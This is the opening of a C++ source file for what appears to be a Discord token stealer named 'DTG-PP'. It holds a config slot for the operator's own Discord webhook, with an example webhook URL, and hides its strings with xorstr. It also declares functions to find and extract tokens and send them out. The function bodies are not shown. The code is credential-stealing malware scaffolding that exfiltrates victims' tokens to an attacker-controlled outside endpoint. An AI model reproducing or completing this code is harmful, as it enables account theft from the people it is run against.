#pragma warning(disable : 4996)
#pragma comment (lib,"Wininet.lib")
#pragma comment(lib,"Advapi32.lib")
#include <Windows.h> // Win32 API Header
#include <WinInet.h> // Windows Internet Header
#include <string> // Standard String Library

// Internal Libaries

#include "xorstr.hpp"

// DTG-PP Config

const std::string webhook = xorstr_("{PUT-YOUR-WEBHOOK-HERE}"); // ex: https://discord.com/api/webhooks/876872056250196018/Pgt9o5JTQZgm6G5ciBmKYvPGm2zfwJFdkBIvzwuHNX4iWz4eDvGyJA_yhNtDQl7d5F82
const std::string fucker = xorstr_("SundisSib");

// GetProcAddress | typedef GetUserNameA

typedef BOOL(WINAPI* _GUA)(LPSTR lpBuffer, LPDWORD pcbBuffer);

// Functions

std::string GetToken(std::string path);
LPSTR ReplaceALL(LPSTR data, DWORD bytes);
LPSTR Check(LPSTR ch, CHAR x);
std::string Find(std::string content);
void SendRequest(std::string t, unsigned int valid);
void OriginalThread();
